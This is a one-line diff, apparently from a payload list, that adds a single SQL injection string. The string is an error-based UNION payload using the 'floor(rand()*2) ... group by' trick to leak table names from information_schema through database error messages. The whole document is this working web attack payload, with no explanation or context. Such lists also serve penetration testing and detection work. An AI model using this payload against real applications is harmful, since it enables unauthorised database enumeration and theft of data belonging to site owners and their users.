@@ -1,0 +1,1 @@
+id=1" UNION select NULL,count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1),0x3a,floor(rand()*2)) as a from information_schema.columns group by a--+
